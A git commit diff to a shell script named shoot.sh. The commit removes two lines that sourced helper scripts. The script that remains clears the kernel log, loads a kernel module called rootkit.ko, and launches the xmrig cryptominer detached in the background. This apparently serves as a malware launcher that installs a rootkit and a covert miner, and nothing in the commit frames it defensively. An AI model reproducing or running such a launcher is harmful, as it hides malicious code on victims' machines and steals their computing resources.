af39ba8d3975c43ad4e122c375c8f67550a4bd5c
Vyom 907 AND Vyom Wankhede <111875466+VYOM00907@users.noreply.github.com>
2022-11-14 12:29:26 +0000

    shhoy

--- shoot.sh
+++ shoot.sh
@@ -21,15 +21,11 @@ echo "installed"
 
 echo "launcher started "
 
-. "./rootin.sh"
-
 echo "loading module"
 dmesg -C 
 insmod rootkit.ko
 dmesg 
 echo "done loading module"
-
-. "./xmin.sh"
 
 setsid xmrig 
 
